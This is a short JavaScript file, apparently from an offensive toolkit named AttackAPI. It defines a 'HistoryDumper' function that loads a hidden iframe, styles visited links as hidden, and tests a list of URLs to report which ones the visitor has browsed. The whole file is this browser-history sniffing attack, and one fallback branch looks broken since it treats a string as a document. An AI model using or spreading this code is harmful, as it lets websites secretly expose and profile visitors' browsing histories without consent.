AttackAPI.HistoryDumper = {};
AttackAPI.HistoryDumper.lazyDump = function (callback, links) {
	var iframe = document.createElement('iframe');
	iframe.style.visibility = 'hidden';
	document.body.appendChild(iframe);
	
	if (iframe.contentDocument)
		var doc = iframe.contentDocument; 
	else if (iframe.contentWindow)
		var doc = iframe.contentWindow.document.body.innerHTML;
	else
		var doc = iframe.document;
		
	doc.open();
	doc.write('<style>a:visited{display: none}</style>');
	doc.close();
	
	for (index = 0; index < links.length; index++) {
		var testLink = doc.createElement('a');
		testLink.href = links[index];
		doc.body.appendChild(testLink);
		
		if (testLink.currentStyle) var display = testLink.currentStyle['display'];
		else var display = doc.defaultView.getComputedStyle(testLink, null).getPropertyValue('display')
			
		callback(links[index], display == 'none'?true:false);
	}
	
	document.body.removeChild(iframe);
};
